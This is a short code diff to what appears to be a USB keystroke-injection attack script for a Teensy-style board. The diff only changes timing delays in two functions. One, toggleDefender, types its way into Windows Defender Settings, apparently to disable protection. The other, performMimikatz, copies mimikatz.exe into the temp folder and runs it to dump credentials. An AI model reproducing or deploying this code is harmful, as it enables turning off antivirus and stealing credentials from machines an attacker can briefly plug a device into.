@@ -226,12 +226,12 @@ void toggleDefender(void)
   Keyboard.send_now();
   delay(1500);
   Keyboard.print("Windows Defender Settings");
-  delay(1500);
+  delay(2000);
   Keyboard.set_key1(KEY_ENTER);
   Keyboard.send_now();
   delay(200);
   unpress_key();
-  delay(200);
+  delay(2400);
   Keyboard.set_key1(KEY_TAB);
   Keyboard.send_now();
   delay(200);
@@ -264,7 +264,7 @@ void performMimikatz(void)
   Keyboard.println(F("$shell.Namespace($env:temp).copyhere($item)"));
   delay(200);
   Keyboard.println(F("}"));  
-  delay(700);
+  delay(1000);
 
   // Start mimikatz
   Keyboard.println(F("Invoke-Expression \"$env:temp\\mimikatz.exe\""));
